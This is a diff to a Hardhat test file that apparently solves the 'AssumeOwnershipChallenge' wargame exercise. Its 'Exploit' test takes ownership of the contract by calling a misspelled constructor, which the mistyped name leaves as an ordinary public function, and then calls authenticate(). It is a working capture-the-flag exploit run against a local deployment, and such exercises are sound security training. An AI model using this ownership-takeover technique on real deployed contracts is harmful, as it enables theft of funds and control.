@@ -1,14 +1,13 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
 import { Contract } from 'ethers';
-import { ethers, network } from 'hardhat';
+import { network, ethers } from 'hardhat';
 const { utils, provider } = ethers;
 
 describe('', () => {
   let target: Contract;
   let owner: SignerWithAddress;
   let attacker: SignerWithAddress;
-
   before(async () => {
     await network.provider.request({
       method: 'hardhat_reset',
@@ -17,16 +16,27 @@ describe('', () => {
 
     [owner, attacker] = await ethers.getSigners();
 
-    const targetFactory = await ethers.getContractFactory('');
+    const targetFactory = await ethers.getContractFactory('AssumeOwnershipChallenge');
+
     target = await targetFactory.deploy();
+
     await target.deployed();
 
     console.log('deployed on', target.address);
   });
 
-  it('exploit', async () => {});
+  it('Exploit', async () => {
+    let tx;
+
+    // The constructor was mispellign
+    tx = await target.connect(attacker).AssumeOwmershipChallenge();
+    await tx.wait();
+
+    tx = await target.connect(attacker).authenticate();
+    await tx.wait();
+  });
 
   after(async () => {
-    expect(true).to.equal(true);
+    expect(await target.isComplete()).to.equal(true);
   });
 });
